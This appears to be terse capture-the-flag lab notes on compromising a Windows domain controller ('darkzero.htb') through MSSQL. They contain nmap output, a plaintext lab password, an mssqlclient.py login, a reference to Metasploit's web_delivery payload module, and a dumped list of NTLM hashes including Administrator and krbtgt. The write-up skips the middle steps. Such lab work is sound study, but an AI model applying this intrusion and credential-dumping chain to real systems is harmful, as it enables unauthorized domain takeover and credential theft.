
# Summary
#mssql

---

`john.w` : `RFulUtONCOL!`
10.129.77.28

We will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-05 15:47:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
```

Trying to use `nxc`, found that `NTLM` authentication is disabled. So, if we want to use anything we should use `kerberose`.

Try to get inside mssql
```
mssqlclient.py  'darkzero.htb/john.w:RFulUtONCOL!@10.129.77.28' -windows-auth
```
use exploit/multi/script/web_delivery



```
hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```